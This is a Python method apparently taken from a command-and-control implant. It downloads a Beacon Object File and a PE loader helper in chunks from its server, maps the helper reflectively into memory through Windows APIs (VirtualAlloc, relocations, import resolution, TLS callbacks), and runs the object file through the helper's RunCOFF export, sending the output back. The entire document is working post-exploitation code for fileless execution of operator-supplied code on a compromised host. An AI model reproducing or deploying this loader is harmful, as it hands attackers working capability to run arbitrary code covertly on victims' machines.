    def execute_coff(self, task_id, function_name, packed_arguments, loader_file, loader_sha256, bof_file="", coff_name=""):
        import base64, ctypes, hashlib, os, re, struct, threading

        def fetch_file(file_id):
            data_out = bytearray()
            total_chunks = 1
            chunk_num = 1
            while chunk_num <= total_chunks:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    raise RuntimeError("Job stopped")
                message = {"action": "post_response", "responses": [{
                    "upload": {"chunk_size": CHUNK_SIZE, "file_id": file_id, "chunk_num": chunk_num},
                    "task_id": task_id
                }]}
                response = self.postMessageAndRetrieveResponse(message)["responses"][0]
                data_out.extend(base64.b64decode(response["chunk_data"]))
                total_chunks = response["total_chunks"]
                chunk_num += 1
            return bytes(data_out)

        def validate_coff(data, entrypoint):
            if len(data) < 20 or len(data) > 2 * 1024 * 1024:
                raise ValueError("COFF must be between 20 bytes and 2 MiB")
            machine, sections, timestamp, symbols_offset, symbols, optional_size, flags = struct.unpack_from("<HHIIIHH", data, 0)
            if machine != 0x8664 or sections < 1 or sections > 96 or optional_size != 0 or symbols < 1 or symbols > 131072:
                raise ValueError("only bounded AMD64 object files without an optional header are supported")
            section_end = 20 + sections * 40
            symbol_end = symbols_offset + symbols * 18
            if section_end > len(data) or symbols_offset < section_end or symbol_end + 4 > len(data):
                raise ValueError("COFF header/table offsets are invalid")
            string_size = struct.unpack_from("<I", data, symbol_end)[0]
            if string_size < 4 or symbol_end + string_size != len(data):
                raise ValueError("COFF string table is invalid or the object contains trailing data")
            section_sizes = []
            total_relocations = 0
            for index in range(sections):
                virtual_size, raw_size, raw_offset, reloc_offset, reloc_count = (
                    struct.unpack_from("<I", data, 20 + index * 40 + 8)[0],
                    struct.unpack_from("<I", data, 20 + index * 40 + 16)[0],
                    struct.unpack_from("<I", data, 20 + index * 40 + 20)[0],
                    struct.unpack_from("<I", data, 20 + index * 40 + 24)[0],
                    struct.unpack_from("<H", data, 20 + index * 40 + 32)[0],
                )
                if max(raw_size, virtual_size) > 2 * 1024 * 1024:
                    raise ValueError("COFF section is too large")
                section_sizes.append(max(raw_size, virtual_size, 1))
                if raw_offset and (raw_offset > len(data) or raw_size > len(data) - raw_offset):
                    raise ValueError("COFF section data is out of bounds")
                if reloc_count and (reloc_offset > len(data) or reloc_count * 10 > len(data) - reloc_offset):
                    raise ValueError("COFF relocations are out of bounds")
                total_relocations += reloc_count
            if total_relocations > 262144:
                raise ValueError("COFF has too many relocations")

            names = {}
            section_numbers = {}
            symbol_values = {}
            index = 0
            entry_found = False
            while index < symbols:
                offset = symbols_offset + index * 18
                raw_name = data[offset:offset + 8]
                if raw_name[:4] == b"\0\0\0\0":
                    name_offset = struct.unpack_from("<I", raw_name, 4)[0]
                    if name_offset < 4 or name_offset >= string_size:
                        raise ValueError("COFF symbol string offset is invalid")
                    end = data.find(b"\0", symbol_end + name_offset, symbol_end + string_size)
                    if end < 0:
                        raise ValueError("COFF symbol string is unterminated")
                    name_raw = data[symbol_end + name_offset:end]
                else:
                    name_raw = raw_name.split(b"\0", 1)[0]
                if not name_raw or len(name_raw) > 1024:
                    raise ValueError("COFF symbol name is invalid")
                try:
                    name = name_raw.decode("ascii")
                except UnicodeDecodeError:
                    raise ValueError("COFF symbol names must be ASCII")
                value = struct.unpack_from("<I", data, offset + 8)[0]
                section_number = struct.unpack_from("<h", data, offset + 12)[0]
                aux_count = data[offset + 17]
                if index + 1 + aux_count > symbols:
                    raise ValueError("COFF auxiliary symbol records are truncated")
                names[index], section_numbers[index], symbol_values[index] = name, section_number, value
                if name == entrypoint and section_number > 0:
                    if section_number > sections or value >= section_sizes[section_number - 1]:
                        raise ValueError("COFF entry point lies outside its section")
                    entry_found = True
                index += 1 + aux_count
            if not entry_found:
                raise ValueError("COFF entry point '{}' was not found".format(entrypoint))

            supported_internal = {
                "BeaconDataParse", "BeaconDataInt", "BeaconDataShort", "BeaconDataLength", "BeaconDataExtract",
                "BeaconFormatAlloc", "BeaconFormatReset", "BeaconFormatFree", "BeaconFormatAppend", "BeaconFormatPrintf",
                "BeaconFormatToString", "BeaconFormatInt", "BeaconPrintf", "BeaconOutput", "BeaconUseToken",
                "BeaconRevertToken", "BeaconIsAdmin", "toWideChar", "LoadLibraryA", "GetProcAddress",
                "GetModuleHandleA", "FreeLibrary",
            }
            for section_index in range(sections):
                item = 20 + section_index * 40
                reloc_offset = struct.unpack_from("<I", data, item + 24)[0]
                reloc_count = struct.unpack_from("<H", data, item + 32)[0]
                for reloc_index in range(reloc_count):
                    reloc_rva, symbol_index, reloc_type = struct.unpack_from("<IIH", data, reloc_offset + reloc_index * 10)
                    width = 8 if reloc_type == 1 else 4
                    if reloc_type not in {0, 1, 3, 4, 5, 6, 7, 8, 9}:
                        raise ValueError("unsupported AMD64 relocation type {}".format(reloc_type))
                    if reloc_type and reloc_rva > section_sizes[section_index] - width:
                        raise ValueError("COFF relocation target is out of bounds")
                    if symbol_index >= symbols:
                        raise ValueError("COFF relocation symbol is out of bounds")
                    symbol_offset = symbols_offset + symbol_index * 18
                    section_number = struct.unpack_from("<h", data, symbol_offset + 12)[0]
                    value = struct.unpack_from("<I", data, symbol_offset + 8)[0]
                    name = names.get(symbol_index)
                    if name and (name.startswith("__imp_") or name == "__C_specific_handler") and (section_number != 0 or value != 0):
                        raise ValueError("COFF import symbol has invalid storage")
                    if section_number > 0 and (section_number > sections or value >= section_sizes[section_number - 1]):
                        raise ValueError("COFF symbol value is out of bounds")
                    if section_number == 0 and value == 0:
                        if not name:
                            raise ValueError("COFF relocation references an auxiliary symbol")
                        if name == "__C_specific_handler":
                            continue
                        if name.startswith("__imp_"):
                            target = name[6:]
                            if target.startswith("Beacon"):
                                if target not in supported_internal:
                                    raise ValueError("unsupported Beacon API: " + target)
                            elif target in supported_internal:
                                continue
                            elif "$" in target:
                                module, function = target.split("$", 1)
                                function = function.split("@", 1)[0]
                                if (not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", module) or
                                        not re.fullmatch(r"[A-Za-z0-9_?.-]{1,256}", function)):
                                    raise ValueError("unsafe dynamic function reference: " + target)
                            else:
                                raise ValueError("unsupported external symbol: " + name)
                        else:
                            raise ValueError("unsupported external symbol: " + name)

        def unmap_helper(state):
            if not state or not state.get("base"):
                return
            k32 = state["k32"]
            if state.get("attached") and state.get("entry"):
                ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)(state["entry"])(
                    ctypes.c_void_p(state["base"]), 0, None)
            for callback in reversed(state.get("tls_callbacks", [])):
                ctypes.CFUNCTYPE(None, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)(callback)(ctypes.c_void_p(state["base"]), 0, None)
            if state.get("tls_index") is not None:
                state["k32"].TlsSetValue(state["tls_index"], None)
                state["k32"].TlsFree(state["tls_index"])
            if state.get("function_table"):
                state["ntdll"].RtlDeleteFunctionTable(ctypes.c_void_p(state["function_table"]))
            k32.VirtualFree(ctypes.c_void_p(state["base"]), 0, 0x8000)
            for module in reversed(state.get("modules", [])):
                k32.FreeLibrary(ctypes.c_void_p(module))
            state["base"] = 0

        def map_helper(image):
            if len(image) < 0x200 or image[:2] != b"MZ":
                raise ValueError("invalid helper DOS header")
            pe = struct.unpack_from("<I", image, 0x3c)[0]
            if pe + 24 > len(image) or image[pe:pe + 4] != b"PE\0\0":
                raise ValueError("invalid helper PE header")
            machine, section_count, timestamp, symbol_ptr, symbol_count, optional_size, characteristics = struct.unpack_from("<HHIIIHH", image, pe + 4)
            optional = pe + 24
            if machine != 0x8664 or not 1 <= section_count <= 32 or optional_size < 0xf0 or optional + optional_size > len(image):
                raise ValueError("unsupported helper PE architecture")
            if struct.unpack_from("<H", image, optional)[0] != 0x20b:
                raise ValueError("helper must be PE32+")
            entry_rva = struct.unpack_from("<I", image, optional + 16)[0]
            preferred = struct.unpack_from("<Q", image, optional + 24)[0]
            size_image = struct.unpack_from("<I", image, optional + 56)[0]
            size_headers = struct.unpack_from("<I", image, optional + 60)[0]
            directory_count = struct.unpack_from("<I", image, optional + 108)[0]
            directories = [struct.unpack_from("<II", image, optional + 112 + index * 8)
                           if index < directory_count and optional + 112 + (index + 1) * 8 <= optional + optional_size else (0, 0)
                           for index in range(16)]
            if size_image < 0x1000 or size_image > 4 * 1024 * 1024 or size_headers > len(image):
                raise ValueError("invalid helper image size")
            if directories[13] != (0, 0):
                raise ValueError("helper delay imports are unsupported")

            sections = []
            section_table = optional + optional_size
            for index in range(section_count):
                item = section_table + index * 40
                if item + 40 > len(image): raise ValueError("helper section table is truncated")
                virtual_size, virtual_address, raw_size, raw_offset, section_flags = (
                    struct.unpack_from("<I", image, item + 8)[0], struct.unpack_from("<I", image, item + 12)[0],
                    struct.unpack_from("<I", image, item + 16)[0], struct.unpack_from("<I", image, item + 20)[0],
                    struct.unpack_from("<I", image, item + 36)[0])
                mapped_size = max(virtual_size, raw_size)
                if virtual_address > size_image or mapped_size > size_image - virtual_address or raw_offset > len(image) or raw_size > len(image) - raw_offset:
                    raise ValueError("helper section exceeds image bounds")
                sections.append((virtual_address, mapped_size, raw_offset, raw_size, section_flags))

            k32 = ctypes.WinDLL("kernel32", use_last_error=True)
            ntdll = ctypes.WinDLL("ntdll", use_last_error=True)
            k32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32]
            k32.VirtualAlloc.restype = ctypes.c_void_p
            k32.VirtualFree.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32]
            k32.VirtualFree.restype = ctypes.c_int
            k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32)]
            k32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
            k32.GetModuleHandleW.restype = ctypes.c_void_p
            k32.LoadLibraryExW.argtypes = [ctypes.c_wchar_p, ctypes.c_void_p, ctypes.c_uint32]
            k32.LoadLibraryExW.restype = ctypes.c_void_p
            k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            k32.GetProcAddress.restype = ctypes.c_void_p
            state = {"base": 0, "entry": 0, "attached": False, "function_table": 0, "modules": [],
                     "tls_index": None, "tls_callbacks": [], "tls_buffer": None, "k32": k32, "ntdll": ntdll}
            try:
                base = k32.VirtualAlloc(None, size_image, 0x3000, 0x04)
                if not base: raise OSError(ctypes.get_last_error(), "VirtualAlloc failed")
                state["base"] = base
                ctypes.memmove(base, bytes(image[:size_headers]), size_headers)
                for rva, mapped_size, raw_offset, raw_size, section_flags in sections:
                    if raw_size: ctypes.memmove(base + rva, bytes(image[raw_offset:raw_offset + raw_size]), raw_size)

                delta = base - preferred
                reloc_rva, reloc_size = directories[5]
                if delta and (not reloc_rva or not reloc_size): raise ValueError("helper has no relocation directory")
                cursor = reloc_rva
                reloc_end = reloc_rva + reloc_size
                while delta and cursor < reloc_end:
                    if cursor > size_image - 8: raise ValueError("invalid helper relocation block")
                    page_rva = ctypes.c_uint32.from_address(base + cursor).value
                    block_size = ctypes.c_uint32.from_address(base + cursor + 4).value
                    if block_size < 8 or block_size > reloc_end - cursor: raise ValueError("invalid helper relocation block size")
                    for item in range((block_size - 8) // 2):
                        value = ctypes.c_uint16.from_address(base + cursor + 8 + item * 2).value
                        kind, offset = value >> 12, value & 0xfff
                        if kind == 0: continue
                        if kind != 10 or page_rva + offset > size_image - 8: raise ValueError("unsupported helper relocation")
                        location = base + page_rva + offset
                        ctypes.c_uint64.from_address(location).value += delta
                    cursor += block_size

                import_rva, import_size = directories[1]
                cursor = import_rva
                import_end = import_rva + import_size
                while import_rva and cursor + 20 <= import_end:
                    original_thunk, stamp, chain, name_rva, first_thunk = [ctypes.c_uint32.from_address(base + cursor + i * 4).value for i in range(5)]
                    if not any((original_thunk, stamp, chain, name_rva, first_thunk)): break
                    if name_rva >= size_image: raise ValueError("helper import name is out of bounds")
                    name_raw = ctypes.string_at(base + name_rva, min(96, size_image - name_rva))
                    if b"\0" not in name_raw: raise ValueError("unterminated helper import module")
                    module_name = name_raw.split(b"\0", 1)[0].decode("ascii")
                    if not re.fullmatch(r"[A-Za-z0-9_.-]{1,64}", module_name): raise ValueError("unsafe helper import module")
                    module = k32.GetModuleHandleW(module_name)
                    if not module:
                        module = k32.LoadLibraryExW(module_name, None, 0x800)
                        if not module: raise OSError(ctypes.get_last_error(), "failed to load system module " + module_name)
                        state["modules"].append(module)
                    source_thunk = original_thunk or first_thunk
                    for index in range(size_image // 8):
                        if source_thunk + index * 8 > size_image - 8 or first_thunk + index * 8 > size_image - 8:
                            raise ValueError("helper import thunk is out of bounds")
                        value = ctypes.c_uint64.from_address(base + source_thunk + index * 8).value
                        if not value: break
                        if value & 0x8000000000000000:
                            lookup = ctypes.c_void_p(value & 0xffff)
                        else:
                            name_address = base + (value & 0x7fffffffffffffff) + 2
                            if name_address < base or name_address >= base + size_image: raise ValueError("helper import is out of bounds")
                            lookup = ctypes.c_void_p(name_address)
                        address = k32.GetProcAddress(ctypes.c_void_p(module), lookup)
                        if not address: raise ValueError("helper import could not be resolved")
                        ctypes.c_uint64.from_address(base + first_thunk + index * 8).value = address
                    cursor += 20

                tls_rva, tls_size = directories[9]
                if tls_rva and tls_size:
                    if tls_size < 40 or tls_rva > size_image - 40: raise ValueError("invalid helper TLS directory")
                    raw_start, raw_end, index_address, callbacks_address = [ctypes.c_uint64.from_address(base + tls_rva + i * 8).value for i in range(4)]
                    zero_fill = ctypes.c_uint32.from_address(base + tls_rva + 32).value
                    if raw_end < raw_start or raw_start < base or raw_end > base + size_image or not (base <= index_address <= base + size_image - 4):
                        raise ValueError("helper TLS data is out of bounds")
                    raw_length = raw_end - raw_start
                    if raw_length + zero_fill > 0x10000: raise ValueError("helper TLS data is too large")
                    tls_buffer = ctypes.create_string_buffer(raw_length + zero_fill)
                    if raw_length: ctypes.memmove(tls_buffer, raw_start, raw_length)
                    tls_index = k32.TlsAlloc()
                    if tls_index == 0xffffffff or not k32.TlsSetValue(tls_index, ctypes.cast(tls_buffer, ctypes.c_void_p)):
                        raise OSError(ctypes.get_last_error(), "helper TLS initialization failed")
                    ctypes.c_uint32.from_address(index_address).value = tls_index
                    state["tls_index"], state["tls_buffer"] = tls_index, tls_buffer
                    if callbacks_address:
                        if callbacks_address < base or callbacks_address >= base + size_image: raise ValueError("helper TLS callbacks are out of bounds")
                        for index in range(64):
                            callback = ctypes.c_uint64.from_address(callbacks_address + index * 8).value
                            if not callback: break
                            if callback < base or callback >= base + size_image: raise ValueError("unsafe helper TLS callback")
                            state["tls_callbacks"].append(callback)

                exception_rva, exception_size = directories[3]
                if exception_rva and exception_size:
                    if exception_size % 12 or exception_rva > size_image or exception_size > size_image - exception_rva:
                        raise ValueError("invalid helper exception directory")
                    ntdll.RtlAddFunctionTable.argtypes = [ctypes.c_void_p, ctypes.c_uint32, ctypes.c_uint64]
                    ntdll.RtlAddFunctionTable.restype = ctypes.c_ubyte
                    if not ntdll.RtlAddFunctionTable(ctypes.c_void_p(base + exception_rva), exception_size // 12, base):
                        raise ValueError("failed to register helper unwind data")
                    state["function_table"] = base + exception_rva

                old = ctypes.c_uint32()
                if not k32.VirtualProtect(ctypes.c_void_p(base), size_headers, 0x02, ctypes.byref(old)):
                    raise OSError(ctypes.get_last_error(), "failed to protect helper headers")
                for rva, mapped_size, raw_offset, raw_size, section_flags in sections:
                    if not mapped_size: continue
                    protection = 0x20 if section_flags & 0x20000000 else (0x04 if section_flags & 0x80000000 else 0x02)
                    if not k32.VirtualProtect(ctypes.c_void_p(base + rva), mapped_size, protection, ctypes.byref(old)):
                        raise OSError(ctypes.get_last_error(), "failed to protect helper section")
                    if protection == 0x20: k32.FlushInstructionCache(ctypes.c_void_p(-1), ctypes.c_void_p(base + rva), mapped_size)
                state["entry"] = base + entry_rva if entry_rva else 0
                for callback in state["tls_callbacks"]:
                    ctypes.CFUNCTYPE(None, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)(callback)(ctypes.c_void_p(base), 1, None)
                if state["entry"] and not ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p)(state["entry"])(ctypes.c_void_p(base), 1, None):
                    raise ValueError("helper rejected process attach")
                state["attached"] = True
                state["directories"] = directories
                state["size"] = size_image
                return state
            except Exception:
                unmap_helper(state)
                raise

        def helper_export(state, export_name):
            base, size_image = state["base"], state["size"]
            export_rva, export_size = state["directories"][0]
            if not export_rva or export_rva > size_image - 40: raise ValueError("helper has no export directory")
            count_functions = ctypes.c_uint32.from_address(base + export_rva + 20).value
            count_names = ctypes.c_uint32.from_address(base + export_rva + 24).value
            functions = ctypes.c_uint32.from_address(base + export_rva + 28).value
            names = ctypes.c_uint32.from_address(base + export_rva + 32).value
            ordinals = ctypes.c_uint32.from_address(base + export_rva + 36).value
            for index in range(count_names):
                if names + index * 4 > size_image - 4 or ordinals + index * 2 > size_image - 2: break
                name_rva = ctypes.c_uint32.from_address(base + names + index * 4).value
                if name_rva >= size_image: continue
                value = ctypes.string_at(base + name_rva, min(128, size_image - name_rva))
                if b"\0" not in value or value.split(b"\0", 1)[0] != export_name.encode("ascii"): continue
                ordinal = ctypes.c_uint16.from_address(base + ordinals + index * 2).value
                if ordinal >= count_functions or functions + ordinal * 4 > size_image - 4: break
                target = ctypes.c_uint32.from_address(base + functions + ordinal * 4).value
                if export_rva <= target < export_rva + export_size: raise ValueError("forwarded helper exports are unsupported")
                return base + target
            raise ValueError("helper export not found: " + export_name)

        if os.name != "nt" or struct.calcsize("P") != 8:
            return "execute_coff requires 64-bit Windows Python"
        if coff_name:
            if not hasattr(self, "_coff_store") or coff_name not in self._coff_store:
                raise ValueError("COFF '{}' is not registered in this agent".format(coff_name))
            bof = bytes(self._coff_store[coff_name])
        elif bof_file:
            bof = fetch_file(bof_file)
        else:
            raise ValueError("select a registered COFF or upload a one-shot BOF")
        helper = fetch_file(loader_file)
        if not re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]{0,127}", function_name):
            raise ValueError("invalid COFF entry point")
        validate_coff(bof, function_name)
        if hashlib.sha256(helper).hexdigest().lower() != loader_sha256.lower():
            raise ValueError("COFF loader helper integrity check failed")
        args = base64.b64decode(packed_arguments)
        if len(args) < 4 or len(args) > 2 * 1024 * 1024:
            raise ValueError("packed BOF arguments are invalid")
        if struct.unpack_from("<I", args, 0)[0] != len(args) - 4:
            raise ValueError("packed BOF argument length is inconsistent")

        loaded = None
        try:
            loaded = map_helper(helper)
            run_coff = ctypes.CFUNCTYPE(ctypes.c_int, ctypes.c_char_p, ctypes.c_void_p, ctypes.c_uint32, ctypes.c_void_p, ctypes.c_int)(helper_export(loaded, "RunCOFF"))
            get_output = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.POINTER(ctypes.c_int))(helper_export(loaded, "BeaconGetOutputData"))
            free_output = ctypes.CFUNCTYPE(None, ctypes.c_void_p)(helper_export(loaded, "BeaconFreeOutputData"))
            bof_buffer = ctypes.create_string_buffer(bof, len(bof))
            arg_buffer = ctypes.create_string_buffer(args, len(args))
            if not hasattr(self, "_coff_lock"):
                self._coff_lock = threading.Lock()
            with self._coff_lock:
                status = run_coff(function_name.encode("ascii"), bof_buffer, len(bof), arg_buffer, len(args))
                output_size = ctypes.c_int(0)
                output_pointer = get_output(ctypes.byref(output_size))
                if output_size.value < 0 or output_size.value > 2 * 1024 * 1024:
                    raise ValueError("COFF output exceeded the safety limit")
                output = ctypes.string_at(output_pointer, output_size.value) if output_pointer else b""
                if output_pointer:
                    free_output(ctypes.c_void_p(output_pointer))
            if status != 0:
                return "COFF loader rejected object (status {})".format(status)
            return output.decode("utf-8", "replace") or "COFF executed without output"
        finally:
            unmap_helper(loaded)
